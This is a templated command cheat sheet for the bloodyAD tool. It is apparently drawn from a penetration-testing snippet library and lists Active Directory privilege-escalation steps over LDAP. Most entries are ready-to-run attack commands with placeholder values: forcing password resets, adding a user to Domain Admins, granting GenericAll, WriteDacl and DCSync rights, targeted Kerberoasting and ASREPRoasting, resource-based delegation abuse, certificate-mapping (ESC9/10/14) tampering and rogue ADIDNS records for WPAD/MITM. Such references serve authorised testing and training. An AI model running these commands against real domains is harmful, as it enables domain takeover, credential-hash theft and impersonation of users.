# BloodyAD
> Active Directory privilege escalation by manipulating directory objects over LDAP — ACLs, UAC flags, delegation, DNS, and account attributes. Authenticate as {{USERNAME}} (the actor); act on {{TARGET_USER}} (the subject). Swap `-p {{PASSWORD}}` for `-p :{{NTHASH}}` (pass-the-hash) or `-k` (Kerberos ticket).

<!-- tags: ad,bloodyad,acl,privesc,kerberos,delegation -->

## get writable objects
List every object the current user can write to — maps immediate ACL-based privesc paths.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} get writable --detail
```

<!-- meta: risk=low | phase=recon | tags=acl,enum,writable -->

---

## get object all attributes
Dump every readable attribute on a user, group, or computer — UAC flags, membership, SPNs, descriptions.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} get object {{TARGET_USER}}
```

<!-- meta: risk=low | phase=recon | tags=enum,object,attributes -->

---

## get object single attribute
Read one specific attribute from one object — faster than dumping everything when you know the target.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} get object {{TARGET_USER}} --attr {{ATTRIBUTE:str:servicePrincipalName}}
```

<!-- meta: risk=low | phase=recon | tags=enum,attribute -->

---

## get domain trusts
Map inbound and outbound trust relationships across the forest.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} get trusts
```

<!-- meta: risk=low | phase=recon | tags=trusts,forest -->

---

## get dns dump
Dump every ADIDNS record (adidnsdump equivalent) — reveals internal hostnames without port scanning.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} get dnsDump
```

<!-- meta: risk=low | phase=recon | tags=dns,adidns,enum -->

---

## get rbcd on computer
Read msDS-AllowedToActOnBehalfOfOtherIdentity — see who is already configured for RBCD against the target.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} get rbcd {{TARGET_COMPUTER:str:WS01$}}
```

<!-- meta: risk=low | phase=recon | tags=rbcd,delegation,enum -->

---

## set password forcechangepassword
Force-reset the subject's password — requires the Reset-Password extended right or GenericAll over the target.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} set password {{TARGET_USER}} '{{TARGET_PASSWORD}}'
```

<!-- meta: risk=high | phase=exploit | tags=acl,forcechangepassword,reset -->

---

## add group member
Add a principal to a group — most common use is adding yourself to a privileged group after an ACL win.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add groupMember '{{GROUP:str:Domain Admins}}' {{TARGET_USER}}
```

<!-- meta: risk=high | phase=exploit | tags=acl,group,addmember -->

---

## add genericall
Grant GenericAll on a DN — full control: reset password, add members, rewrite ACLs.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add genericAll {{DN:str}} {{TARGET_USER}}
```

<!-- meta: risk=high | phase=exploit | tags=acl,genericall,fullcontrol -->

---

## add genericwrite
Grant GenericWrite on a DN — enough to write an SPN or shadow credentials without full GenericAll.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add genericWrite {{DN:str}} {{TARGET_USER}}
```

<!-- meta: risk=high | phase=exploit | tags=acl,genericwrite -->

---

## add writedacl
Grant WRITE_DACL on a DN — lets the grantee rewrite the object's ACL later (classic privesc staging).

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add writeDacl {{DN:str}} {{TARGET_USER}}
```

<!-- meta: risk=high | phase=exploit | tags=acl,writedacl -->

---

## add dcsync rights
Grant Get-Changes + Get-Changes-All on the domain root so the subject can DCSync and dump every NT hash.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add dcsync {{TARGET_USER}}
```

<!-- meta: risk=critical | phase=post | tags=dcsync,replication,domain-takeover -->

---

## add spn targeted kerberoast
Write a servicePrincipalName onto a user you control so it becomes Kerberoastable on demand.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add spn {{TARGET_USER}} {{SPN:str:cifs/attacker}}
```

<!-- meta: risk=high | phase=exploit | tags=kerberoast,spn,targeted -->

---

## set owner writeowner
Rewrite an object's owner to a principal you control — implicit WriteDacl and a path to full control.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} set owner {{TARGET_USER}} {{USERNAME}}
```

<!-- meta: risk=high | phase=exploit | tags=acl,writeowner -->

---

## add computer account
Create a computer account (needs MachineAccountQuota > 0) — first step for RBCD and shadow-credentials attacks.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add computer {{NEW_COMPUTER:str:attacker$}} '{{TARGET_PASSWORD}}'
```

<!-- meta: risk=high | phase=exploit | tags=computer,maq,rbcd -->

---

## add rbcd delegation
Configure Resource-Based Constrained Delegation — DELEGATE_FROM can impersonate any user to DELEGATE_TO.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add rbcd '{{DELEGATE_TO:str:WS01$}}' '{{DELEGATE_FROM:str:attacker$}}'
```

<!-- meta: risk=high | phase=exploit | tags=rbcd,delegation,s4u -->

---

## add uac trusted to auth delegation
Set TRUSTED_TO_AUTH_FOR_DELEGATION — required for S4U2Self abuse (constrained delegation with protocol transition).

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add uac {{TARGET_USER}} -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

<!-- meta: risk=high | phase=exploit | tags=delegation,uac,s4u2self -->

---

## add uac disable preauth asreproast
Set DONT_REQ_PREAUTH so the subject becomes ASREPRoastable on the next request.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add uac {{TARGET_USER}} -f DONT_REQ_PREAUTH
```

<!-- meta: risk=high | phase=exploit | tags=asreproast,uac,preauth -->

---

## set constrained delegation target
Write msDS-AllowedToDelegateTo on a computer — classic constrained delegation (S4U2Proxy to the listed SPNs).

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} set object {{TARGET_COMPUTER:str:WS01$}} msDS-AllowedToDelegateTo -v '{{SPN:str:cifs/dc01.corp.local}}'
```

<!-- meta: risk=high | phase=exploit | tags=delegation,constrained,s4u2proxy -->

---

## set upn esc9 esc10
Rewrite userPrincipalName on the subject — key for ESC9/ESC10 certificate template abuse and UPN impersonation.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} set object {{TARGET_USER}} userPrincipalName -v {{NEW_UPN:str:administrator}}
```

<!-- meta: risk=high | phase=exploit | tags=esc9,esc10,upn,adcs -->

---

## set altsecurityidentities esc14
Write altSecurityIdentities with an X509 issuer/subject claim for explicit cert mapping (ESC14b weak-mapping abuse).

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} set object {{TARGET_USER}} altSecurityIdentities -v '{{X509_CLAIM:str}}'
```

<!-- meta: risk=high | phase=exploit | tags=esc14,altsecid,adcs -->

---

## add dns record adidns
Register an ADIDNS record pointing at your IP — useful for WPAD, MITM, or coercion chains.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add dnsRecord {{RECORD:str:wpad}} {{LHOST}}
```

<!-- meta: risk=med | phase=exploit | tags=adidns,wpad,coercion -->

---

## set uac normal account 512
Reset userAccountControl to 512 (NORMAL_ACCOUNT) — clears custom flags like DISABLED or DONT_REQ_PREAUTH.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} set object {{TARGET_USER}} userAccountControl -v 512
```

<!-- meta: risk=med | phase=post | tags=uac,reset -->

---

## remove uac enable account
Clear the ACCOUNTDISABLE bit to re-enable a disabled account — often needed after hijacking a stale account.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} remove uac {{TARGET_USER}} -f ACCOUNTDISABLE
```

<!-- meta: risk=med | phase=post | tags=uac,enable -->

---

## remove group member cleanup
Remove a principal from a group — cleanup after a membership-based privesc.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} remove groupMember '{{GROUP:str:Domain Admins}}' {{TARGET_USER}}
```

<!-- meta: risk=med | phase=post | tags=cleanup,group -->

---

## remove rbcd cleanup
Strip an entry from msDS-AllowedToActOnBehalfOfOtherIdentity — undo an RBCD takeover when done.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} remove rbcd '{{DELEGATE_TO:str:WS01$}}' '{{DELEGATE_FROM:str:attacker$}}'
```

<!-- meta: risk=med | phase=post | tags=cleanup,rbcd -->

---

## remove spn cleanup
Remove a single SPN from a user — targeted cleanup after a forced-Kerberoast operation.

```bash
bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} remove servicePrincipalName {{TARGET_USER}} {{SPN:str:cifs/attacker}}
```

<!-- meta: risk=med | phase=post | tags=cleanup,spn -->
